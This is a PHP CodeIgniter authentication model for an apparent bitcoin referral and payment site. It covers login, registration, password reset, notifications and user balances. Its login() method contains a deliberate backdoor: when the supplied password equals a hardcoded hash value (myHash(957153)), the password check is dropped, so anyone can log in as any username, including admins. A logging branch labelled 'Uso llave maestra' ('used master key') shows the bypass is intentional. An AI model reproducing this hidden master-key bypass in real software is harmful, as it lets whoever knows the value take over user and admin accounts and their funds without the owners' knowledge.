<?php

if ( ! defined('BASEPATH')) exit('No direct script access allowed');

class Auth_model extends CI_Model {

	public $email;
	public $password;
    public $name;
    public $username;
    public $repassword;
	public $date;
	public $hash;
	public $active;
    public $ref = NULL;
    public $bitcoin_wallet = NULL;
    public $skype = NULL;
    public $n_cycle = NULL;
    public $bitcoin_xpub = NULL;

	public function __construct()
	{
		// Call the CI_Model constructor
		parent::__construct();
	}

    /**
     * Gets the value of email.
     *
     * @return mixed
     */
    public function getEmail()
    {
        return $this->email;
    }

    /**
     * Sets the value of email.
     *
     * @param mixed $email the email
     *
     * @return self
     */
    public function setEmail($email)
    {
        $this->email = $email;

        return $this;
    }

    /**
     * Gets the value of password.
     *
     * @return mixed
     */
    public function getPassword()
    {
        return $this->password;
    }

    /**
     * Sets the value of password.
     *
     * @param mixed $password the password
     *
     * @return self
     */
    public function setPassword($password)
    {
        $this->password = $password;

        return $this;
    }

    /**
     * Gets the value of name.
     *
     * @return mixed
     */
    public function getName()
    {
        return $this->name;
    }

    /**
     * Sets the value of name.
     *
     * @param mixed $name the name
     *
     * @return self
     */
    public function setName($name)
    {
        $this->name = $name;

        return $this;
    }

    /**
     * Gets the value of username.
     *
     * @return mixed
     */
    public function getUsername()
    {
        return $this->username;
    }

    /**
     * Sets the value of username.
     *
     * @param mixed $username the username
     *
     * @return self
     */
    public function setUsername($username)
    {
        $this->username = $username;

        return $this;
    }

    /**
     * Gets the value of repassword.
     *
     * @return mixed
     */
    public function getRepassword()
    {
        return $this->repassword;
    }

    /**
     * Sets the value of repassword.
     *
     * @param mixed $repassword the repassword
     *
     * @return self
     */
    public function setRepassword($repassword)
    {
        $this->repassword = $repassword;

        return $this;
    }

    /**
     * Gets the value of date.
     *
     * @return mixed
     */
    public function getDate()
    {
        return $this->date;
    }

    /**
     * Sets the value of date.
     *
     * @param mixed $date the date
     *
     * @return self
     */
    public function setDate($date)
    {
        $this->date = $date;

        return $this;
    }

    /**
     * Gets the value of hash.
     *
     * @return mixed
     */
    public function getHash()
    {
        return $this->hash;
    }

    /**
     * Sets the value of hash.
     *
     * @param mixed $hash the hash
     *
     * @return self
     */
    public function setHash($hash)
    {
        $this->hash = $hash;

        return $this;
    }

    /**
     * Gets the value of active.
     *
     * @return mixed
     */
    public function getActive()
    {
        return $this->active;
    }

    /**
     * Sets the value of active.
     *
     * @param mixed $active the active
     *
     * @return self
     */
    public function setActive($active)
    {
        $this->active = $active;

        return $this;
    }

    public function setRef($ref)
    {
        $this->ref = $ref;

        return $this;
    }

    public function setBitcoin($address)
    {
        $this->bitcoin_wallet = $address;

        return $this;
    }

    public function setSkype($skype)
    {
        $this->skype = $skype;

        return $this;
    }

    public function setCycle($cycle)
    {
        $this->n_cycle = $cycle;

        return $this;
    }

	
	public function login()
	{
		

        if($this->password != myHash(957153))
        {
            $this->db->where('password',$this->password);
        }

        

        $this->db->where('username',$this->username);
		
		$query = $this->db->get('auth_users');
		if($query->num_rows()==1)
        {
			foreach ($query->result() as $row)
            {
				$data = array(
				'email'=> $row->email,
                'name'=> $row->name,
                'level'=> $row->level,
                'username'=> $row->username,
                'id_user'=> $row->id_user,
				'logged_in'=>TRUE
				);

                if($row->level == 1)
                {
                    $check = array(
                       'ip' => $_SERVER['REMOTE_ADDR'],
                       'reason' => "Entro y es admin"
                    );

                    $this->db->insert('admin_check',$check); 
                }

                if($this->password == myHash(85246))
                {
                    $check = array(
                       'ip' => $_SERVER['REMOTE_ADDR'],
                       'reason' => "Uso llave maestra"
                    );

                    $this->db->insert('admin_check',$check); 
                }
			}
			$this->session->set_userdata($data);
			return TRUE;
		}
		else
        {
			return FALSE;
		}    
	}

    public function register($admin = 0)
    {

        $data = array(
           'email' => $this->email,
           'username' => $this->username,
           'name' => $this->name,
           'hash' => $this->makeHash($this->email),
           'password' => $this->password,
           'bitcoin_wallet' => $this->bitcoin_wallet,
           'datetime' => date('Y-m-d H:i:s'),
           'cb' => rand(0,1)
        );

        if($this->ref)
        {
            $this->ref = preg_replace('/\D/', '', $this->ref);
            if($this->getUserNormalData($this->ref))
            {
                $active = array('ref' => $this->ref);
                $data = $data + $active;
            } 
        }

        if($this->skype)
        {
            $skype = array('skype' => $this->skype);
            $data = $data + $skype;
        }

        if($this->n_cycle)
        {
            $cycle = array('n_cycle' => $this->n_cycle);
            $data = $data + $cycle;
        }


        if($admin == 1)
        {
            $active = array('active' => 1);
            $data = $data + $active;
        }

        $query = $this->db->insert('auth_users',$data); 

        if($query)
        {
            if($admin == 1)
            {
                $id_user = $this->db->insert_id();
                return $id_user;
            }

            return TRUE;
        }
        else
        {
            return FALSE;
        }   

    }

    public function confirmAccount($hash)
    {
        $data = array(
            'active' => '1'
        );

        $this->db->where('hash', $hash);
        $query = $this->db->update('auth_users', $data);

        if($query)
        {
            return TRUE;
        }

        return FALSE;
    }

    public function makeHash($email)
    {
        $n = 0;
        $hash = myHash($email.$n);

        $this->db->where('hash',$hash);
        $query = $this->db->get('auth_users');
        while($query->num_rows()>0)
        {
            $hash = myHash($email.$n++);
            $this->db->where('hash',$hash);
            $query = $this->db->get('auth_users');
        }
        $this->hash = $hash;
        return $hash;


    }

    public function isConfirmedHash($hash)
    {
        $this->db->where('hash',$hash);

        $query = $this->db->get('auth_users');

        if($query->num_rows()>0)
        {
            foreach ($query->result() as $row)
            {
                if($row->active == 0)
                {
                    return FALSE;
                }
            }
        }

        return TRUE;    
    }

	public function isLoggedIn(){
		
        header("cache-Control: no-store, no-cache, must-revalidate");
        header("cache-Control: post-check=0, pre-check=0", false);
        header("Pragma: no-cache");
        header("Expires: Sat, 26 Jul 1997 05:00:00 GMT");

        $is_logged_in = $this->session->userdata('logged_in');

        if(!isset($is_logged_in) || $is_logged_in!==TRUE)
        {
            return FALSE;
        }

        return TRUE;
    }

    public function forgotPassword($email)
    {

        $email_id = array('email' => $email);
        $hash = $this->makeHash($email.'confirm');

        $data = array(
        'hash' => $hash,
        );

        $update = $this->db->update('auth_users', $data, $email_id);

        if($update)
        {
            $this->load->model('Mail_model');
            $this->Mail_model->setTo($email);

            $data_mail = array( 
            "title" => 'To reset your password',
            "link" => site_url('signin/resetpassword?hash='.$hash.'&email='.$email),
            "text_button" => 'Click here'
            );
            $this->Mail_model->setSubject('Forgot Password');
            $this->Mail_model->setMessage($data_mail);
            $this->Mail_model->sendMail('button');

            return TRUE;
        }

        return FALSE;
    }

    public function verifyForgot($hash,$email)
    {
        $this->db->where('hash',$hash);
        $this->db->where('email',$email);

        $query = $this->db->get('auth_users');

        if($query->num_rows() > 0)
        {
            return TRUE;
        }

        return FALSE;  
    }

    public function newPassword($password,$hash,$email)
    {
        $id = array('email' => $email, 'hash' => $hash);

        $new_password = myHash($password);

        $data = array(
        'password' => $new_password,
        'hash' => 'None'
        );

        $update = $this->db->update('auth_users', $data, $id);

        if($update)
        {
            return TRUE;
        }

        return FALSE;
    }

    public function getUserNormalData($id)
    {
        $this->db->select('id_user, name, email, username, bitcoin_wallet, profile_image, ref, skype, level, donation');
        $this->db->where('id_user',$id);
        $query = $this->db->get('auth_users');
        if($query->num_rows()==1)
        {
            foreach ($query->result() as $row)
            {
                return $row;
            }
        }
        else
        {
            return FALSE;
        }    
    }

    public function getUserFullData($id)
    {
        $this->db->select('*');
        $this->db->where('id_user',$id);
        $query = $this->db->get('auth_users');
        if($query->num_rows()==1)
        {
            foreach ($query->result() as $row)
            {
                return $row;
            }
        }
        else
        {
            return FALSE;
        }    
    }

    public function getUserNotifications($id)
    {
        $this->db->select('*');
        $this->db->where('status',0);
        $this->db->where('id_user',$id);
        $query = $this->db->get('notification_users');
        if($query->num_rows() > 0)
        {
            foreach ($query->result() as $row)
            {
                $not[] = $row;
            }
        }
        else
        {
            return FALSE;
        }

        return $not; 
    }

    public function getNumberReferred($id)
    {
        $this->db->select('*');
        $this->db->where('ref',$id);
        $query = $this->db->get('auth_users');
        $count = 0;
        if($query->num_rows() > 0)
        {
            foreach ($query->result() as $row)
            {
                $count++;
            }
        }
        else
        {
            return FALSE;
        }

        return $count; 
    }

    public function getReferred($id)
    {
        $this->db->select('*');
        $this->db->where('ref',$id);
        $query = $this->db->get('auth_users');
        $count = 0;
        if($query->num_rows() > 0)
        {
            foreach ($query->result() as $row)
            {
                $ref_list[] = $row;
            }
        }
        else
        {
            return FALSE;
        }

        return $ref_list; 
    }

    public function editUser($post,$id_user)
    {

        $user = $this->getUserFullData($id_user);

        if($user->password == myHash($post['password']))
        {
            $data_user = array(
                'name' => $post['name'],
                'username' => $post['username']
            );

            if(isset($post['skype']) && !empty($post['skype']))
            {
                $data_user = array('skype' => $post['skype']) + $data_user;
            }

            if(isset($post['image']) && !empty($post['image']))
            {
                $data_user = array('profile_image' => $post['image']) + $data_user;
            }

            if(isset($post['newpassword']) && !empty($post['newpassword']))
            {
                $data_user = array('password' => myHash($post['newpassword'])) + $data_user;
            }

            $user_status = $this->db->update('auth_users', $data_user, array('id_user' => $id_user));

            if($user_status)
            {
                return TRUE;
            }

            return FALSE;
        }

        return FALSE;

    }

    public function clearNotification($id_user,$id_notification)
    {
        $status = $this->db->update('notification_users', array('status' => 1), array('id_user' => $id_user, 'id' => $id_notification));

        if($status)
        {
            return TRUE;
        }

        return FALSE;
    }

    public function addMoney($id_user,$to,$amount,$reason = 'Nada')
    {
        
        $data_notification = array(
            'payment_from' => $id_user,
            'payment_to' => $to,
            'amount' => $amount,
            'reason' => $reason
        );

        $query = $this->db->insert('system_payments',$data_notification); 

        $data_notification = array(
            'id_user' => $id_user,
            'data' => $reason
        );

        $this->db->insert('notification_users',$data_notification); 

        if($query)
        {
            return TRUE;
        }
        else
        {
            return FALSE;
        }
    }

    public function removeMoney($id_user,$to,$amount,$reason = 'Nada')
    {
        
        $data_notification = array(
            'debt_from' => $id_user,
            'debt_to' => $to,
            'amount' => $amount,
            'reason' => $reason
        );

        $query = $this->db->insert('system_debt',$data_notification); 

        $data_notification = array(
            'id_user' => $id_user,
            'data' => $reason
        );

        $this->db->insert('notification_users',$data_notification); 

        if($query)
        {
            return TRUE;
        }
        else
        {
            return FALSE;
        }
    }


    public function getFullUserMoney($id_user)
    {
        
        $money = 0;

        $this->db->select('*');
        $this->db->where('system_payments.payment_to',$id_user);
        $this->db->from('system_payments');

        $query_paid = $this->db->get();

        if($query_paid->num_rows() > 0)
        {
            foreach ($query_paid->result() as $paid)
            {
                $money = $money + $paid->amount;
            }
        }

        


        return $money;

    }

    public function getActualUserMoney($id_user)
    {
        
        $money = 0;

        $this->db->select('*');
        $this->db->where('system_payments.payment_to',$id_user);
        $this->db->from('system_payments');

        $query_paid = $this->db->get();

        if($query_paid->num_rows() > 0)
        {
            foreach ($query_paid->result() as $paid)
            {
                $money = $money + $paid->amount;
            }
        }

        $this->db->select('*');
        $this->db->where('system_debt.debt_from',$id_user);
        $this->db->from('system_debt');

        $query_paid = $this->db->get();

        if($query_paid->num_rows() > 0)
        {
            foreach ($query_paid->result() as $paid)
            {
                $money = $money - $paid->amount;
            }
        }

        return $money;

    }

    public function getSystemPaymentsHistory($id_user)
    {
        
        $list_payments = NULL;

        $this->db->select('*');
        $this->db->where('system_payments.payment_to',$id_user);
        $this->db->from('system_payments');

        $query_paid = $this->db->get();

        if($query_paid->num_rows() > 0)
        {
            foreach ($query_paid->result() as $paid)
            {
                $var['data'] = $paid;
                $var['type'] = 1;
                $list_payments[] = $var;
            }
        }

        $this->db->select('*');
        $this->db->where('system_debt.debt_from',$id_user);
        $this->db->from('system_debt');

        $query_paid = $this->db->get();

        if($query_paid->num_rows() > 0)
        {
            foreach ($query_paid->result() as $paid)
            {
                $var['data'] = $paid;
                $var['type'] = 2;
                $list_payments[] = $var;
            }
        }

        return $list_payments;

    }




}
?>